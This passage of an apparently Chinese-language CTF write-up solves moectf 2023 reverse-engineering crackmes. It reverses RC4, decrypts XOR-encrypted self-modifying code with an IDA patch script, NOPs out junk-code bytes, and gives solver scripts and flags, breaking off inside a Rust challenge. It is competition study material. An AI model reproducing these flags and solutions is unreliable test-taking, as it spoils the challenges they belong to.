<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> a1<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> a3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span>
        <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span>
        <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a4 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"moectf2023"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> a6 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>
    <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
        a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> a6<span class="token punctuation">]</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        v10 <span class="token operator">=</span> <span class="token punctuation">(</span>a2<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> v10<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> v12 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v10<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>v10<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v12<span class="token punctuation">;</span>
        result <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>a4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        v9 <span class="token operator">=</span> <span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
        v11 <span class="token operator">=</span> <span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>
        v13 <span class="token operator">=</span> a1<span class="token punctuation">[</span>v11<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">=</span> v13<span class="token punctuation">;</span>
        a3<span class="token punctuation">[</span>v14<span class="token punctuation">]</span> <span class="token operator">^=</span> a1<span class="token punctuation">[</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        v14<span class="token operator">++</span><span class="token punctuation">;</span>
        a4<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span> a3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ascii解密拿到flag moectf{y0u_r3a11y_understand_rc4!!!!}</p>
<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>Self-Modifying Code顾名思义，工作起来分三步，编译的时候将函数的字节码加密插入程序，然后用VirtualProtect修改内存的保护(text段修改成可写的)，然后运行解密函数将这个函数解密</p>
<p>查询了一下，大多数smc相关的题目有关字节码加密的操作使用异或的挺多的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-78h]</span>
  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-78h]</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-6Ch] BYREF</span>

  <span class="token function">sub_401087</span><span class="token punctuation">(</span>aPlzInputYourFl<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_401023</span><span class="token punctuation">(</span>aS<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4011E0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_401050</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">sub_401087</span><span class="token punctuation">(</span>aGood<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">sub_401087</span><span class="token punctuation">(</span>aTryAgainPlease<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前面的是vfprint和vfscanf</p>
<p>sub_4011E0(); return了一个 sub_401550()</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> sub_401550<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> result<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>1Ch<span class="token punctuation">]</span>
  DWORD flOldProtect<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>8h<span class="token punctuation">]</span> BYREF

  flOldProtect<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>
  flOldProtect<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>8u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> VirtualProtect<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>loc_4014D0 <span class="token operator">-</span> <span class="token punctuation">(</span>unsigned <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>loc_4014D0 <span class="token operator">%</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> 0x1000u<span class="token punctuation">,</span> 0x80u<span class="token punctuation">,</span> flOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">122</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>loc_4014D0 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span><span class="token operator">=</span> 0x66u<span class="token punctuation">;</span>
    result <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>VirtualProtect修改了内存页的权限，可读可写可执行，并填充0xcccc初始化了，然后下面loc_4014D0 按字节异或0x66u 122次</p>
<p>使用ida中的script command把0x4014D0以及往后的121个字节处理一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x4014D0</span><span class="token punctuation">,</span><span class="token number">0x40154a</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    patch_byte<span class="token punctuation">(</span>i<span class="token punctuation">,</span>get_wide_byte<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x66</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>出现了push ebp，下面的全是db,转成数组然后转code转function，注意第一个db的位置是4014D1</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl sub_4014D1<span class="token punctuation">(</span><span class="token builtin">int</span> a1<span class="token punctuation">,</span> char <span class="token operator">*</span>Str<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  size_t i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>8h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>ebp<span class="token operator">-</span>4h<span class="token punctuation">]</span>

  v4 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> strlen<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>unsigned __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x39</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>unsigned __int8<span class="token punctuation">)</span>byte_40A000<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在if中是</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">sub_401050</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">JUMPOUT</span><span class="token punctuation">(</span><span class="token number">0x4014D0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以只需要把byte_40A000[i]异或一遍0x39 -57然后转ascii就能拿到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0x8d</span><span class="token punctuation">,</span> <span class="token number">0xb5</span><span class="token punctuation">,</span> <span class="token number">0xa7</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0xa4</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xa6</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9b</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x9e</span><span class="token punctuation">,</span> <span class="token number">0x8f</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token operator">^</span> <span class="token number">0x39</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">57</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>moectf{Self_Mod1f1cation}</p>
<h2 id="junk-code"><a href="#junk-code" class="headerlink" title="junk_code"></a>junk_code</h2><p>sub_45A9A0(Str, 18) &amp;&amp; sub_459EBF(v5, 18)中有call花指令影响ida分析，只需要patch 0x90(nop)掉ida就能正常分析了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Str1 <span class="token operator">=</span> <span class="token string">'hj`^oavt+pZm`h+q._'</span>
Str1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> Str1<span class="token punctuation">]</span>

Str2 <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>
    <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span>
    <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>
<span class="token punctuation">]</span>
Str2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x66</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> Str2<span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>Str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>Str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h2><p>cargo是rust的包管理器</p>
<p>cargo new project_aaaa 创建一个项目</p>
<p>cargo bulid 构建 cargo run 运行</p>
<p><a target="_blank" rel="noopener" href="https://rustwiki.org/zh-CN/book/">https://rustwiki.org/zh-CN/book/</a> rust基础语法</p>
<p>反编译后的代码量比较多，对于容器还有一些函数的操作，会有很多类型校验，值校验的操作，所以伪代码会比较多</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> v28 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token namespace">std<span class="token punctuation">::</span>io<span class="token punctuation">::</span></span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> v28<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> input <span class="token operator">=</span> v28<span class="token punctuation">.</span><span class="token function">trim_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">30</span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Error: Input length must be 30 characters"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">std<span class="token punctuation">::</span>process<span class="token punctuation">::</span></span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">let</span> byte_array<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
        <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span>
        <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span>
        <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span>
        <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xF5</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> <span class="token keyword">mut</span> v34<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>c<span class="token closure-punctuation punctuation">|</span></span> c <span class="token keyword">as</span> <span class="token keyword">u8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">let</span> <span class="token keyword">mut</span> v38 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte<span class="token punctuation">)</span> <span class="token keyword">in</span> byte_array<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
